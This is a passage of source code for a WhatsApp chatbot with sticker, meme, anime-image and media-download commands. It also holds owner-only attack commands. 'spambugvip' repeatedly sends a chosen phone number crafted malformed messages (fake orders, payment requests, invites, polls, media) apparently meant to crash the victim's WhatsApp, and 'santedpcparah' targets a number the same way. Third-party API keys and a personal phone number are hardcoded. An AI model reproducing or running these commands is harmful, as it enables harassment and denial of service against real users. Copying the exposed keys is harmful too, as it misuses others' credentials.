                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                //if (isBan) return reply(mess.ban)	 			
                //if (isBanChat) return reply(mess.banChat)
                //if (!m.isGroup) return replay(mess.group)
                if (args.length < 1) return m.reply('type autosticker on to activate\ntype autosticker off to disable')
                if (args[0]  === 'on'){
                if (isAutoStick) return m.reply(`Already activated`)
                _autostick.push(from)
                fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
                m.reply('autosticker pc activated')
                } else if (args[0] === 'disable'){
                let anu = autosticker.indexOf(from)
                _autostick.splice(anu, 1)
                fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
                m.reply('autosticker pc deactivated')
            }
            break
        case 'dogesticker':
        case 'dogestick':{
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 1 // -1 limit
                var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
                var wifegerak = ano.split('\n')
                var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                encmedia = await bluz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
                await fs.unlinkSync(encmedia)
                }
                break
        case 'gura':
        case 'gurastick':{
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 1 // -1 limit
                var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
                var wifegerak = ano.split('\n')
                var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                encmedia = await bluz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
                await fs.unlinkSync(encmedia)
                }
                break
        case 'lovesticker':
        case 'lovestick' :{
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 1 // -1 limit
                var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                var wifegerak = ano.split('\n')
                var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                encmedia = await bluz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
                await fs.unlinkSync(encmedia)
                }
                break
        case 'patrick':
        case 'patricksticker': {
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 1 // -1 limit
                var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
                var wifegerak = ano.split('\n')
                var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                encmedia = await bluz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
                await fs.unlinkSync(encmedia)
                }
                break
        case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if ( checklimitUser(sender) <= 0) return m.reply(mess.endLimit)
                let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) throw respond
                if (!text) throw respond
                m.reply(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await bluz.downloadMediaMessage(qmsg)
                let { floNime } = require('./lib/uploader')
                let fatGans = await floNime(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
        // ERROR let smeme = `https://raku-web.herokuapp.com/api/meme?apikey=RakuKeyTod&text=${atas}&text2=${bawah}&url=${fatGans.result.url}`
                let FaTiH = await bluz.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
                await fs.unlinkSync(FaTiH)
                confirmlimit(sender, 2)
            }
            break
        case 'sticker': case 's': case 'stickergif': case 'sgif':
            try {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (/image/.test(mime)) {
                m.reply(mess.wait)
                let media = await bluz.downloadMediaMessage(qmsg)
                let encmedia = await bluz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                m.reply(mess.wait)
                if (qmsg.seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await bluz.downloadMediaMessage(qmsg)
                let encmedia = await bluz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
                   }
            } catch {
                const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
                if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
                let pack = 'BluzBot'
                let author = 't.me/bluzbots'
                if (/image/.test(mime)) {
          
                  let media = await quoted.download()
             
              let sticker = new Sticker(media, {
                  pack: pack, // The pack name
                  author: author, // The author name
                  type: 'full',
                  categories: ['🤩', '🎉'], // The sticker category
                  id: '12345', // The sticker id
                  quality: 75, // The quality of the output file
                  background: 'transparent' // The sticker background color (only for full stickers)
              })
             
              const buffer = await sticker.toBuffer()
              bluz.sendMessage(m.chat, {sticker: buffer}, {quoted: m})
          
              } else if (/video/.test(mime)) {
                  if ((quoted.msg || quoted).seconds > 20) return bluz.sendMessage(m.from,{text:'🕐 Cannot fetch videos longer than *11 Seconds*'})
                  let media = await quoted.download()
              let sticker = new Sticker(media, {
                  pack: pack, // The pack name
                  author: author, // The author name
                  type: body.includes("#c")|| body.includes("#crop")? StickerTypes.CROPPED: StickerTypes.FULL, // The sticker type
                  categories: ['🤩', '🎉'], // The sticker category
                  id: '12345', // The sticker id
                  quality: 30, // The quality of the output file
                  background: 'transparent' // The sticker background color (only for full stickers)
              })
          
              const stikk = await sticker.toBuffer()
          
          
              bluz.sendMessage(m.chat, {sticker: stikk}, {quoted: m})
              } else {
                  bluz.sendMessage(m.chat,{text:"❌ Could not find any Image/Video in context"},{quoted:m})
                  }
            }
            break
        case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isPremium && global.db.data.users[m.sender].limit < 10) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 10 // -1 limit
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
                if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
            	m.reply(mess.wait)
                if (/image/.test(mime)) {
                let media = await bluz.downloadMediaMessage(qmsg)
                let encmedia = await bluz.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await bluz.downloadMediaMessage(qmsg)
                let encmedia = await bluz.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                   }
            }
            break
        case 'snobg': {
            //if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            //if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 3 // -1 limit
            try {
                let { TelegraPh } = require('./lib/uploader')
                m.reply(mess.wait)
                mee = await bluz.downloadAndSaveMediaMessage(quoted)
                mem = await TelegraPh(mee)
                meme = `https://api.lolhuman.xyz/api/convert/towebp?apikey=@nc0kb4j1n64n&img=${mem}`
                memek = await bluz.sendImageAsSticker(m.chat, meme, m, { sticker })
                await fs.unlinkSync(memek)
            } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur Tiktok2 Sedang ERROR!'}, {quoted:m})
                    m.reply('Fitur Tiktok Sedang Snobg, Sihlakan gunakan removebg')}
            }
                break
                case 'smeme2':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    //if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
                    //db.data.users[m.sender].limit -= 3 // -1 limit
                    atas = text.split('|')[0] ? text.split('|')[0] : '-'
                    bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                        let { TelegraPh } = require('./lib/uploader')
                        m.reply(mess.wait)
                        mee = await bluz.downloadAndSaveMediaMessage(quoted)
                        mem = await TelegraPh(mee)
                    let meme2 = await getBuffer(`https://api.lolhuman.xyz/api/stickermeme?apikey=a0cb6a1d5f68505d5cbf77dd&texttop=${encodeURIComponent(atas)}&textbottom=${encodeURIComponent(bawah)}&img=${mem}`)
                    console.log(meme2)
                    //await sleep(5000)
                        await bluz.sendMessage(m.chat, { sticker: meme2 }, m)
                        break
                case 's2':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    //if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
                    //db.data.users[m.sender].limit -= 3 // -1 limit
                        let { TelegraPh2 } = require('./lib/uploader')
                        m.reply(mess.wait)
                        mee = await bluz.downloadAndSaveMediaMessage(quoted)
                        mem = await TelegraPh2(mee)
                    let meme = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=@nc0kb4j1n64n&img=${mem}&package=BluzBot&author=Follow%20Telegram:%20t.me/bluzbots`)
                    console.log(meme)
                    //await sleep(5000)
                        await bluz.sendMessage(m.chat, { sticker: meme }, m)
                        break
                case 's3':
                    let andi = await getBuffer(`https://www19.online-convert.com/dl/web7/download-file/13f44e52-7309-4c9c-aace-59eab8bb743b/photo-2021-02-05-10-13-39.webp`)
                case 'nulis3':{
                    //if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
                try {
                    m.reply(mess.wait)
                    let nus = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=@nc0kb4j1n64n&img=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg`)
                    console.log(nus)
                    await bluz.sendMessage(m.chat, { sticker: nus }, m)
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur snobg lolapi Sedang ERROR!'}, {quoted:m})
                    m.reply('Fitur nulis sedang error, Sihlakan gunakan beberapa saat lagi')}
                }
                break
        case 'lick':case 'kiss':case 'neko':
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 1 // -1 limit
            try {    
            m.reply(mess.wait)
				axios.get(`https://api.waifu.pics/sfw/${command}`)
				.then(({data}) => {
				bluz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
				})
            } catch {
                bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Fitur ${command} error`}, {quoted:m})
                m.reply(`Fitur ${command} sedang error`)}
			break
        case 'cry':case 'kill':case 'hug':case 'pat':case 'bite':case 'yeet':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 1 // -1 limit
            try {    
                m.reply(mess.wait)
                axios.get(`https://api.waifu.pics/sfw/${command}`)
                .then(({data}) => {
                bluz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
                })
            } catch {
                bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Fitur ${command} error`}, {quoted:m})
                m.reply(`Fitur ${command} sedang error`)}
			break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap':
            try {
                m.reply(mess.wait)
		        axios.get(`https://api.waifu.pics/sfw/${command}`)
                .then(({data}) => {
                    bluz.sendMessage(m.chat, { image: { url: data.url }, caption: '⭔ Generate Random : '+ command }, { quoted: m })
            })
            } catch {
                bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Fitur ${command} error`}, {quoted:m})
                m.reply(`Fitur ${command} sedang error`)}
            break
            // case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
            //     m.reply(mess.wait)
            //     bluz.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            // }
            // break
            case 'twt':
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!q) throw (mess.link)
                m.reply(mess.wait)
                hxz.twitter(q).then( data => {
                //bluz.sendMessage(from, { video: { url: data.HD }}, { quoted: m })
                bluz.sendMessage(m.chat, { video: { url: data.HD }, caption: `*----「 TWITTER DOWNLOAD 」----*\n\n*Deskripsi :* ${data.desc}\n` }, { quoted: m })
                console.log(data)
                }).catch(() => m.reply(mess.error.api))
                break
                case'test':
                await bluz.sendMessage(m.chat, { text: `
Cara Menginstal BotWa di termux
1. https://f-droid.org/en/packages/com.termux/ 
$ termux-setup-storage
$ apt update && apt upgrade
$ apt install git -y
$ apt install nodejs -y
$ apt install ffmpeg -y
$ apt install git
$ git clone https://github.com/DikaArdnt/Hisoka-Morou
$ cd Hisoka-Morou
$ npm install` })
                break
                case'hapusvirtex':
                await bluz.sendMessage(m.chat, { text: `
Biar ga hapus data tutor buat nomor masih aktif

Jika WhatsApp Crash Force Close Terus
- Download WhatsApp Bussiness
- Login Pake Wa Yang Kena Virtex
- Cari Nomer Anonym Yang Chatnya banyak
- Block Nomer & Hapus Chat
- Login Lagi Ke WhatsApp Ori` })
                break
                case 'santedpcparah': 
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Contoh ${command} 6281297970769`)
nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == isCreator ) return m.reply('Tidak Bisa, Karena Itu Nomer Developer')
let hdhe = await bluz.onWhatsApp(nmn)
if (hdhe.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
santedpc(bygbt, nmn, sleep)
await sleep(2000)
m.reply(`Sukses Tuan`)
break
                case 'spambugvip':{
                    if (!isCreator) return m.reply(mess.owner)
                    if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 628362663622|5`)
                    numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
                    jumlah = q.split('|')[1]
                    let cekno = await bluz.onWhatsApp(numt)
                    if (cekno.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
                    if (isNaN(jumlah)) return m.reply(`Harus berupa angka`)
                    var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6285807264974@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
                    var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
                    var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: bluz.waUploadToServer })
                    var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
                    var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
                    var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
                    var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
                    var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: lep })
                    var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
                    for (let i = 0; i < jumlah; i++) {
                    bluz.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
                    bluz.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
                    bluz.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
                    bluz.relayMessage(numt, order.message, { messageId: order.key.id })
                    bluz.relayMessage(numt, audio.message, { messageId: audio.key.id })
                    bluz.relayMessage(numt, image.message, { messageId: image.key.id })
                    bluz.relayMessage(numt, document.message, { messageId: document.key.id })
                    bluz.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
                    bluz.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
                    bluz.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-bluz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
                    bluz.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
                    }
                    }
                    break
                case'nulis':
                if(args.length < 1) return m.reply('text nya')
                m.reply(mess.wait)
                await bluz.sendMessage(from,{image:{url:`https://api.lolhuman.xyz/api/nulis?apikey=${lolkey}&text=${body.slice(6)}`},caption: `Hati Hati Ketahuan`},{quote:m}).catch((e) => m.reply(e))
                break
                case 'nulis2':{
                    if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
                    db.data.users[m.sender].limit -= 3 // -1 limit
                try {
                    m.reply(mess.wait)
                    up = text.split('|')[0] ? text.split('|')[0] : '-'
                    let nus = await getBuffer(`https://api.lolhuman.xyz/api/nulis?apikey=${lolkey}&text=${up}`)
                    console.log(nus)
                    await bluz.sendMessage(m.chat, { image: nus }, m)
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur snobg lolapi Sedang ERROR!'}, {quoted:m})
                    m.reply('Fitur nulis sedang error, Sihlakan gunakan beberapa saat lagi')}
                }
                break
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await bluz.sendImage(m.chat, anu.result.img, `⭔ Title : ${anu.result.lagu}\n⭔ Album : ${anu.result.album}\n⭔ Singer : ${anu.result.penyanyi}\n⭔ Publish : ${anu.result.publish}\n⭔ Lirik :\n${anu.result.lirik.result}`, m)
                bluz.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await bluz.sendImage(m.chat, anu.result.thumb, `⭔ Title : ${anu.result.title}\n⭔ Url : ${isUrl(text)[0]}`)
                bluz.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, '7f44df3b91'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                bluz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await bluz.sendMessage(m.chat, buttonMessage, { quoted: m })
                bluz.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                bluz.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: bluz.user.name,
			buttons,
			headerType: 4
		    }
		    bluz.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        bluz.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
        if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		bluz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
        if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		bluz.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'hadits': case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
